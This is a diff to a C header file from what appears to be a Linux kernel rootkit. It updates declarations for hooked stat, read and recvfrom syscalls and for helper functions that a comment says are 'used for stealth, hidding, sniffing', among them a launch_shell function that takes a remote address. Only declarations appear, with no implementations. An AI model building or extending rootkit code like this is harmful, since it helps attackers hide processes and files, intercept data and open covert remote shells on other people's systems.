@@ -103,10 +103,10 @@ extern asmlinkage long my_fstatat6464(int dfd, const char __user *filename, stru
 extern asmlinkage long my_lstat6464(const char __user *filename, struct stat64 __user *statbuf);
 extern asmlinkage long my_stat6464(const char __user *filename, struct stat64 __user *statbuf);
 extern asmlinkage long my_newfstatat64(int dfd, const char __user *filename, struct stat __user *statbuf, int flag);
-extern asmlinkage long my_newlstat64(const char __user *filename, struct __old_kernel_stat __user *statbuf);
-extern asmlinkage long my_newstat64(const char __user *filename, struct __old_kernel_stat __user *statbuf);
-extern asmlinkage long my_lstat64(const char __user * filename, struct __old_kernel_stat __user * statbuf);
-extern asmlinkage long my_stat64(const char __user *filename, struct __old_kernel_stat __user *statbuf);
+extern asmlinkage long my_newlstat64(const char __user *filename, struct stat __user *statbuf);
+extern asmlinkage long my_newstat64(const char __user *filename, struct stat __user *statbuf);
+extern asmlinkage long my_lstat64(const char __user * filename, struct stat __user * statbuf);
+extern asmlinkage long my_stat64(const char __user *filename, struct stat __user *statbuf);
 
 /* compat hook handlers */
 extern asmlinkage int my_recvfrom32(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len);
@@ -115,7 +115,8 @@ extern asmlinkage int my_read32(int fd, void __user *buf, size_t len);
 /*
  * RK Kernel funcs: used for stealth, hidding, sniffing, etc.
  */
-extern bool check_pid_in_path(const char *path);
+extern int get_fd_path(int fd, char *path);
+extern bool check_pid_in_path(int dfd, const char *path);
 extern void *alloc_umem(size_t len);
 extern long free_umem(void *ptr, size_t len);
 extern int launch_shell(struct sockaddr_in dest);
